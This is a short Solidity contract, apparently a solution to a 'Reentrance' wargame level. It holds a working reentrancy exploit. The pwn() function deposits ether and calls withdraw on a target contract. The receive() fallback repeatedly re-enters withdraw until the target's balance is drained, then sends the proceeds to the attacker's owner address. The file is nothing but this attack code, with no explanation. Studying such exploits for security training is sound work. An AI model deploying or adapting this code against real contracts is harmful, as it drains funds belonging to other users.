// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract WithdrawAll {
    address target;
    address owner;
    uint256 amount;

    constructor() {
        owner = msg.sender;
    }

    function pwn(address _target) external payable {
        target = _target;
        amount = msg.value;
        IReentrance(target).donate{value: amount}(address(this));
        if (IReentrance(target).balanceOf(address(this)) > 0) {
            IReentrance(target).withdraw(amount);
        }
    }

    receive() external payable {
        if (address(target).balance > 0) {
            IReentrance(target).withdraw(address(target).balance);
        } else {
            owner.call{value: address(this).balance}("");
        }
    }

}
